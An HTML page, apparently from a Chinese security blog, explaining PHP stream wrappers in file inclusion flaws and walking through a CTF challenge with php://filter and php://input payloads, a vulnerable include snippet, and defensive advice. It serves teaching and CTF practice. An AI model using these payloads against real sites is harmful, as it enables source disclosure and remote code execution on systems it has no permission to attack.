@@ -1,0 +1,466 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 7.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"zyufoye.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="PHP伪协议详解与CTF示例前言在 Web 安全以及 CTF 竞赛中，文件包含漏洞（File Inclusion, LFI&#x2F;RFI） 是一种极其常见的漏洞类型。而在利用文件包含漏洞时，PHP 伪协议（PHP Pseudo-protocols &#x2F; Stream Wrappers） 无疑是我们手中最强大的工具之一。本文将对 PHP 伪协议的分类、原理进行系统梳理，并通过一个典型的 CTF 题目加深理解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PHP伪协议详解与CTF示例">
+<meta property="og:url" content="https://zyufoye.github.io/2026/08/03/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%E4%B8%8ECTF%E7%A4%BA%E4%BE%8B/index.html">
+<meta property="og:site_name" content="Aono Note">
+<meta property="og:description" content="PHP伪协议详解与CTF示例前言在 Web 安全以及 CTF 竞赛中，文件包含漏洞（File Inclusion, LFI&#x2F;RFI） 是一种极其常见的漏洞类型。而在利用文件包含漏洞时，PHP 伪协议（PHP Pseudo-protocols &#x2F; Stream Wrappers） 无疑是我们手中最强大的工具之一。本文将对 PHP 伪协议的分类、原理进行系统梳理，并通过一个典型的 CTF 题目加深理解">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2026-08-03T09:21:34.000Z">
+<meta property="article:modified_time" content="2026-08-03T09:25:36.482Z">
+<meta property="article:author" content="Aono">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="文件包含">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://zyufoye.github.io/2026/08/03/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%E4%B8%8ECTF%E7%A4%BA%E4%BE%8B/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zyufoye.github.io/2026/08/03/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%E4%B8%8ECTF%E7%A4%BA%E4%BE%8B/","path":"2026/08/03/PHP伪协议详解与CTF示例/","title":"PHP伪协议详解与CTF示例"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>PHP伪协议详解与CTF示例 | Aono Note</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Aono Note</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">好记性不如烂键盘</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%E4%B8%8ECTF%E7%A4%BA%E4%BE%8B"><span class="nav-number">1.</span> <span class="nav-text">PHP伪协议详解与CTF示例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF-PHP-%E4%BC%AA%E5%8D%8F%E8%AE%AE%EF%BC%9F"><span class="nav-number">1.2.</span> <span class="nav-text">一、什么是 PHP 伪协议？</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-%E5%85%B3%E9%94%AE%E9%85%8D%E7%BD%AE%E9%A1%B9-php-ini"><span class="nav-number">1.2.1.</span> <span class="nav-text">1.1 关键配置项 (php.ini)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E5%B8%B8%E8%A7%81%E4%BC%AA%E5%8D%8F%E8%AE%AE%E4%B8%80%E8%A7%88%E8%A1%A8"><span class="nav-number">1.2.2.</span> <span class="nav-text">1.2 常见伪协议一览表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%A0%B8%E5%BF%83%E4%BC%AA%E5%8D%8F%E8%AE%AE%E6%B7%B1%E5%85%A5%E5%89%96%E6%9E%90"><span class="nav-number">1.3.</span> <span class="nav-text">二、核心伪协议深入剖析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-php-filter%EF%BC%88%E8%AF%BB%E5%8F%96%E6%BA%90%E7%A0%81%EF%BC%89"><span class="nav-number">1.3.1.</span> <span class="nav-text">2.1 php:&#x2F;&#x2F;filter（读取源码）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-php-input%EF%BC%88%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="nav-number">1.3.2.</span> <span class="nav-text">2.2 php:&#x2F;&#x2F;input（任意代码执行）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81-ACTF2020-%E6%96%B0%E7%94%9F%E8%B5%9B-Include"><span class="nav-number">1.4.</span> <span class="nav-text">三、[ACTF2020 新生赛]Include</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E9%A2%98%E7%9B%AE%E5%9C%BA%E6%99%AF%E4%B8%8E%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-number">1.4.1.</span> <span class="nav-text">3.1 题目场景与源码分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-%E6%9E%84%E9%80%A0-Payload-%E8%A7%A3%E9%A2%98"><span class="nav-number">1.4.2.</span> <span class="nav-text">3.2 构造 Payload 解题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%9A%E6%9E%84%E9%80%A0-php-filter-%E5%8D%8F%E8%AE%AE-URL"><span class="nav-number">1.4.2.1.</span> <span class="nav-text">第一步：构造 php:&#x2F;&#x2F;filter 协议 URL</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E6%AD%A5%EF%BC%9A%E8%8E%B7%E5%8F%96%E5%93%8D%E5%BA%94%E7%BB%93%E6%9E%9C"><span class="nav-number">1.4.2.2.</span> <span class="nav-text">第二步：获取响应结果</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%9A%E8%A7%A3%E7%A0%81%E6%8B%BF-Flag"><span class="nav-number">1.4.2.3.</span> <span class="nav-text">第三步：解码拿 Flag</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%BC%80%E5%8F%91%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE"><span class="nav-number">1.5.</span> <span class="nav-text">四、开发与防御建议</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">1.6.</span> <span class="nav-text">总结</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Aono"
+      src="/uploads/kehan.jpg">
+  <p class="site-author-name" itemprop="name">Aono</p>
+  <div class="site-description" itemprop="description">专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">101</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">52</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/zyufoye" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zyufoye" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:zygoticx@163.com" title="E-Mail → mailto:zygoticx@163.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://zyufoye.github.io/2026/08/03/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%A6%E8%A7%A3%E4%B8%8ECTF%E7%A4%BA%E4%BE%8B/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/uploads/kehan.jpg">
+      <meta itemprop="name" content="Aono">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Aono Note">
+      <meta itemprop="description" content="专注于网络安全学习与实践的个人博客，记录AI安全、攻防技术、漏洞分析、工具使用与踩坑经验。 不生产知识，只做知识的搬运工。">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="PHP伪协议详解与CTF示例 | Aono Note">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          PHP伪协议详解与CTF示例
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+      
+
+      <time title="创建时间：2026-08-03 17:21:34 / 修改时间：17:25:36" itemprop="dateCreated datePublished" datetime="2026-08-03T17:21:34+08:00">2026-08-03</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="PHP伪协议详解与CTF示例"><a href="#PHP伪协议详解与CTF示例" class="headerlink" title="PHP伪协议详解与CTF示例"></a>PHP伪协议详解与CTF示例</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在 Web 安全以及 CTF 竞赛中，<strong>文件包含漏洞（File Inclusion, LFI/RFI）</strong> 是一种极其常见的漏洞类型。而在利用文件包含漏洞时，<strong>PHP 伪协议（PHP Pseudo-protocols / Stream Wrappers）</strong> 无疑是我们手中最强大的工具之一。本文将对 PHP 伪协议的分类、原理进行系统梳理，并通过一个典型的 CTF 题目加深理解。</p>
+<h2 id="一、什么是-PHP-伪协议？"><a href="#一、什么是-PHP-伪协议？" class="headerlink" title="一、什么是 PHP 伪协议？"></a>一、什么是 PHP 伪协议？</h2><p>PHP 带有许多内置的<strong>流包装器（Stream Wrappers）</strong>，即我们常说的“伪协议”。它允许开发者像访问本地文件一样去操作各种不同的数据源（例如网络请求、标准输入输出流、Base64 字符流、压缩包等）。</p>
+<p>在代码中，像 <code>include()</code>, <code>require()</code>, <code>file_get_contents()</code>, <code>file_put_contents()</code> 等文件操作函数，如果传入的参数可控且使用了伪协议，就会触发不一样的逻辑。</p>
+<h3 id="1-1-关键配置项-php-ini"><a href="#1-1-关键配置项-php-ini" class="headerlink" title="1.1 关键配置项 (php.ini)"></a>1.1 关键配置项 (<code>php.ini</code>)</h3><p>伪协议能否生效，很大程度上取决于 PHP 的配置文件 <code>php.ini</code> 中的两个核心参数：</p>
+<ul>
+<li><code>allow_url_fopen</code>：是否允许将 URL 当作文件打开（默认开启 <code>On</code>）。</li>
+<li><code>allow_url_include</code>：是否允许将 URL 作为 <code>include/require</code> 的参数包含（<strong>非常关键</strong>，默认关闭 <code>Off</code>）。</li>
+</ul>
+<h3 id="1-2-常见伪协议一览表"><a href="#1-2-常见伪协议一览表" class="headerlink" title="1.2 常见伪协议一览表"></a>1.2 常见伪协议一览表</h3><div class="table-container">
+<table>
+<thead>
+<tr>
+<th style="text-align:left">伪协议</th>
+<th style="text-align:left">主要作用</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:left"><code>file://</code></td>
+<td style="text-align:left">访问本地文件系统</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>php://filter</code></td>
+<td style="text-align:left">对读取/写入的流进行过滤处理（常用于<strong>读源码</strong>）</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>php://input</code></td>
+<td style="text-align:left">读取 POST 原始数据（常用于<strong>命令执行</strong>）</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>data://</code></td>
+<td style="text-align:left">直接传输数据流（常用于<strong>命令执行</strong>）</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>http://</code><strong> / </strong><code>https://</code></td>
+<td style="text-align:left">远程文件包含（RFI）</td>
+</tr>
+<tr>
+<td style="text-align:left"><code>phar://</code><strong> / </strong><code>zip://</code></td>
+<td style="text-align:left">解压并读取压缩包内的文件</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h2 id="二、核心伪协议深入剖析"><a href="#二、核心伪协议深入剖析" class="headerlink" title="二、核心伪协议深入剖析"></a>二、核心伪协议深入剖析</h2><p>在实际渗透和解题中，使用频率最高的应该是 <code>php://filter</code> 和 <code>php://input</code>。</p>
+<h3 id="2-1-php-filter（读取源码）"><a href="#2-1-php-filter（读取源码）" class="headerlink" title="2.1 php://filter（读取源码）"></a>2.1 <code>php://filter</code>（读取源码）</h3><p><strong>原理</strong>：<code>php://filter</code> 允许在“读取文件内容”与“代码被 PHP 解析”之间插入一个<strong>过滤器（Filter）</strong>。</p>
+<p>如果我们直接用 <code>include(&quot;flag.php&quot;)</code>，PHP 会将 <code>flag.php</code> 里的代码当场<strong>解析并执行</strong>，前端页面只能看到执行结果，拿不到变量 <code>$flag = &quot;xxx&quot;</code> 的源码。但如果使用 <code>php://filter</code> 加载 Base64 过滤器，文件内容就会被转换成 Base64 文本返回，<strong>避免了被 PHP 当作代码执行</strong>。</p>
+<p><strong>通用语法格式</strong>：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/[读写模式]=[过滤器名称]/resource=[目标文件]</span><br></pre></td></tr></table></figure>
+<p><strong>常用 Payload</strong>（以 Base64 编码读取 <code>flag.php</code> 为例）：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h3 id="2-2-php-input（任意代码执行）"><a href="#2-2-php-input（任意代码执行）" class="headerlink" title="2.2 php://input（任意代码执行）"></a>2.2 <code>php://input</code>（任意代码执行）</h3><p><strong>原理</strong>：可以读取请求中的 <strong>Raw POST Data（原始 POST 报文主体）</strong>。当它被 <code>include</code> 包含时，POST 请求体里的内容就会被当作 PHP 代码直接执行。</p>
+<p><strong>常用 Payload</strong>：</p>
+<ul>
+<li><strong>请求 URL</strong>：<code>http://target.com/index.php?file=php://input</code></li>
+<li><strong>POST 请求体内容</strong>：</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><em>(注意：使用此协议需 </em><code>allow_url_include = On</code><em>)</em></p>
+<h2 id="三、-ACTF2020-新生赛-Include"><a href="#三、-ACTF2020-新生赛-Include" class="headerlink" title="三、[ACTF2020 新生赛]Include"></a>三、<code>[ACTF2020 新生赛]Include</code></h2><h3 id="3-1-题目场景与源码分析"><a href="#3-1-题目场景与源码分析" class="headerlink" title="3.1 题目场景与源码分析"></a>3.1 题目场景与源码分析</h3><p>访问题目页面，发现 URL 带有明显的参数：<br><code>http://challenge.site/index.php?file=flag.php</code></p>
+<p>页面只显示了一句类似于 <em>“Can you find flag?”</em> 的提示，并没有直接把 Flag 印在页面上。</p>
+<p>假设后端的代码逻辑如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>); <span class="comment">// 存在本地文件包含漏洞</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome! Try ?file=flag.php&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p><strong>分析原因</strong>：<code>flag.php</code> 中的源码可能是这样的：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$flag</span> = <span class="string">&quot;flag&#123;a1b2c3d4-e5f6-7890-php_pseudo_protocol&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>因为变量 <code>$flag</code> 被直接载入内存，并没有被 <code>echo</code> 出来，直接请求 <code>?file=flag.php</code> 页面自然一片空白。</p>
+<h3 id="3-2-构造-Payload-解题"><a href="#3-2-构造-Payload-解题" class="headerlink" title="3.2 构造 Payload 解题"></a>3.2 构造 Payload 解题</h3><p>为了不让 PHP 执行 <code>flag.php</code>，我们需要把它的源码以 Base64 文本形式拿出来。</p>
+<h4 id="第一步：构造-php-filter-协议-URL"><a href="#第一步：构造-php-filter-协议-URL" class="headerlink" title="第一步：构造 php://filter 协议 URL"></a>第一步：构造 <code>php://filter</code> 协议 URL</h4><p>在浏览器参数中输入：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.site/index.php?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
+<h4 id="第二步：获取响应结果"><a href="#第二步：获取响应结果" class="headerlink" title="第二步：获取响应结果"></a>第二步：获取响应结果</h4><p>回车发送请求后，页面上不再是原本的提示，而是渲染出了一串 Base64 编码后的文本：</p>
+<figure class="highlight latex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgCiRmbGFnID0gImZsYWd7YTFiMmMzZDQtZTVmNi03ODkwLXBocF9wc2V1ZG9fcHJvdG9jb2x9IjsKPz4=</span><br></pre></td></tr></table></figure>
+<h4 id="第三步：解码拿-Flag"><a href="#第三步：解码拿-Flag" class="headerlink" title="第三步：解码拿 Flag"></a>第三步：解码拿 Flag</h4><p>打开命令行或在线解码工具，对该字符串进行 Base64 解码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&quot;PD9waHAgCiRmbGFnID0gImZsYWd7YTFiMmMzZDQtZTVmNi03ODkwLXBocF9wc2V1ZG9fcHJvdG9jb2x9IjsKPz4=&quot;</span> | <span class="built_in">base64</span> -d</span><br></pre></td></tr></table></figure>
+<p><strong>解码结果</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="variable">$flag</span> = <span class="string">&quot;flag&#123;a1b2c3d4-e5f6-7890-php_pseudo_protocol&#125;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>成功拿到原原本本的 <code>flag.php</code> 源码及 Flag！</p>
+<h2 id="四、开发与防御建议"><a href="#四、开发与防御建议" class="headerlink" title="四、开发与防御建议"></a>四、开发与防御建议</h2><p>从安全角度来看，造成伪协议被恶意利用的根源是<strong>不安全的动态文件包含</strong>。要防止此类漏洞，建议采取以下防御措施：</p>
+<ol>
+<li><strong>禁用敏感配置</strong>：在 <code>php.ini</code> 中确保关闭 <code>allow_url_include = Off</code>。</li>
+<li><strong>白名单映射</strong>：不要直接将用户可控的参数传入 <code>include()</code> / <code>require()</code>，建议采用固定映射字典：</li>
+</ol>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$allowed_pages</span> = [</span><br><span class="line">    <span class="string">&#x27;home&#x27;</span> =&gt; <span class="string">&#x27;pages/home.php&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;about&#x27;</span> =&gt; <span class="string">&#x27;pages/about.php&#x27;</span></span><br><span class="line">];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$allowed_pages</span>[<span class="variable">$page</span>])) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$allowed_pages</span>[<span class="variable">$page</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ol>
+<li><strong>严格过滤输入</strong>：使用 <code>basename()</code> 或禁止 <code>/</code>, <code>\</code>, <code>php://</code>, <code>data://</code> 等特殊字符。</li>
+</ol>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>PHP 伪协议是 Web 安全很常见的内容。总结起来：</p>
+<ul>
+<li>要读源码，首选 <code>php://filter</code>（配合 Base64 编码）。</li>
+<li>要拿 Shell/执行命令，可考虑 <code>php://input</code> 或 <code>data://</code>（需配合 <code>allow_url_include=On</code>）。</li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/PHP/" rel="tag"># PHP</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" rel="tag"># 文件包含</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2026/07/12/CISP%E8%80%83%E8%AF%95%E9%A2%98%E7%AE%80%E8%AE%B0/" rel="prev" title="CISP考试题简记">
+                  <i class="fa fa-angle-left"></i> CISP考试题简记
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2026/08/07/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%8F%8A%E5%BA%94%E7%94%A8%E4%B8%93%E9%A2%98-%E8%BD%AF%E8%80%83Summer/" rel="next" title="密码学及应用专题-软考Summer">
